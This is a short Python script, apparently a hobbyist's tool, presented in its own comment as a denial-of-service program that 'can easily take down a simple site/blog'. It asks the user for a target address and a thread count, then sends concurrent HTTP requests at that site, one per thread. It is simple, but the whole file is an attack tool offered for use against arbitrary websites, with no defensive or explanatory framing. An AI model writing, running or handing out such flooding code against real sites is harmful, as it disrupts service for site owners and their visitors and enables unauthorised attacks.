import requests
import threading
from utils import clear_terminal, ascii_art

clear_terminal()

#This DOS can easily take down a simple site/blog

def ping_website(url):
    try:
        response = requests.get(url)
        print(f"Ping to {url}: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error pinging {url}: {e}")

def main():
    target = "https://" + input("Paste a site address (without https://): ").strip()
    num_threads = input("Enter the number of threads: ").strip()

    # Checagem para ver se da um bug (se threads < 0 aborta missão)
    if not num_threads.isdigit() or int(num_threads) <= 0:
        print("Threads cannot be < 0.")
        return
    
    num_threads = int(num_threads)

    #Apenas para organizar melhor e deixar o painel mais agradavel visualmente, colocando minha assinatura
    clear_terminal()
    print(ascii_art)
    
    print(f"Target: {target}")
    print(f"Number of threads: {num_threads}")
    print()

    #Aqui ele ja abre um array de threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=ping_website, args=(target,))
        thread.start()
        threads.append(thread)

    #A cada request no array ele le e solta de uma vez só
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
